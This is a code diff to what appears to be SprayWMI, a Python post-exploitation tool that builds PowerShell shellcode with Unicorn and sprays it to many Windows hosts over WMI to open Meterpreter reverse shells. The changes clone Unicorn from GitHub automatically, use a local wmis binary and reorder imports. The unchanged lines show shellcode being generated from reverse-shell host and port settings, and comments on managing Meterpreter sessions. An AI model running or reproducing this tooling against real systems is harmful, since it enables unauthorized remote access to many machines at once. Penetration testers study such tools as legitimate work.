@@ -16,12 +16,25 @@
 # Make sure to close meterpreter properly (exit or kill session) - or else the server may spike high CPU - weirdness with powershell
 
 # CONFIGURE THE PATH TO UNICORN: github.com/trustedsec/unicorn
+import subprocess
+import os
+import sys
+import time
+definepath = os.getcwd()
 unicorn = ("/pentest/post-exploitation/unicorn/")
+if not os.path.isdir("/pentest/post-exploitation/unicorn/"):
+	if not os.path.isdir(definepath + "/unicorn/"):
+		print ("[!] Unicorn not detected, checking out for you automatically")
+		subprocess.Popen("git clone https://github.com/trustedsec/unicorn unicorn/", shell=True).wait()
 
+	unicorn = (definepath + "/unicorn/")
+				
 # CONFIGURE PATH TO WMIS - https://www.trustedsec.com/june-2015/no_psexec_needed/
 # if you have trouble with this on 64 bit - try:
 # dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386
-wmi = ("/usr/local/bin/wmis")
+wmi = ("./wmis")
+if os.path.isfile("wmis"):
+	subprocess.Popen("chmod +x wmis", shell=True).wait()
 
 # flag to turn verbosity on
 verbose = "off"
@@ -34,11 +47,6 @@ except ImportError:
 	except ImportError:
 		print ("[!] Sorry couldn't install pexpect for you, try installing manually - python-pexpect")
 		sys.exit()
-
-import sys
-import subprocess
-import os
-import time
 
 # main variable assignment from command line parameters
 optional = ""
@@ -88,7 +96,6 @@ print ("[*] Launching SprayWMI on the hosts specified...")
 
 # start unicorn first
 if os.path.isfile(unicorn + "/unicorn.py"):
-	definepath = os.getcwd()
 	os.chdir(unicorn)
 	print ("[*] Generating shellcode through unicorn, could take a few seconds...")
 	subprocess.Popen("python unicorn.py %s %s %s" % (meta, revshell, revport), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
